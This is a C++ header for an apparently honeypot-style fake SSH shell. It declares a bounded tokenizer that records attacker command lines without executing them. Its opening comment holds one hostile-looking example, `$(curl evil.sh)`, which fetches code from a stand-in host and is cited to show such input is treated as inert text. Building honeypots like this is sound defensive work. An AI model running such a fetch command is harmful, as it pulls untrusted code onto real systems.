// Splitting an attacker's command line into something the fake shell can
// dispatch on.
//
// This is a tokenizer, not a shell. It understands quoting and separators well
// enough to recognise what was typed, and it understands nothing else: there
// is no expansion, no substitution, no globbing and above all no execution.
// `$(curl evil.sh)` is three tokens of text to be recorded, never a command to
// run. That is safety invariant S1 at the parsing layer.
//
// Everything here is bounded. It runs on the session thread against input
// chosen by the attacker, so a line of a million quotes has to cost the same
// as a line of ten.
#pragma once

#include <cstddef>
#include <cstdint>
#include <string>
#include <string_view>
#include <vector>

namespace arapuca::ssh {

/// How one segment was joined to the previous one. Recorded because an
/// attacker writing `a && b` is telling us something different from `a ; b`.
enum class Separator : std::uint8_t {
    None,        ///< first segment
    Semicolon,   ///< ;
    And,         ///< &&
    Or,          ///< ||
    Pipe,        ///< |
    Background,  ///< &
};

[[nodiscard]] std::string_view to_string(Separator separator);

struct Segment {
    std::vector<std::string> argv;
    Separator separator = Separator::None;
    /// The text of this segment as typed, for the transcript.
    std::string raw;
};

struct ParsedCommandLine {
    std::vector<Segment> segments;
    /// Set when the line was cut short by a limit rather than ending.
    bool truncated = false;
    /// Set when a quote was left open, which real shells would prompt about.
    bool unterminated_quote = false;
};

/// Tokens in one segment, and segments in one line. A line past either limit
/// is parsed up to the limit and flagged, never rejected silently: the point
/// is to record what was attempted.
inline constexpr std::size_t kMaxTokensPerSegment = 256;
inline constexpr std::size_t kMaxSegments = 64;
inline constexpr std::size_t kMaxTokenLength = 4096;

[[nodiscard]] ParsedCommandLine parse_command_line(std::string_view line);

/// Tokenize a single segment, with no separator handling. Exposed because it
/// is the narrowest fuzz target and because several commands need to split
/// their own arguments.
[[nodiscard]] std::vector<std::string> tokenize(std::string_view input);

}  // namespace arapuca::ssh
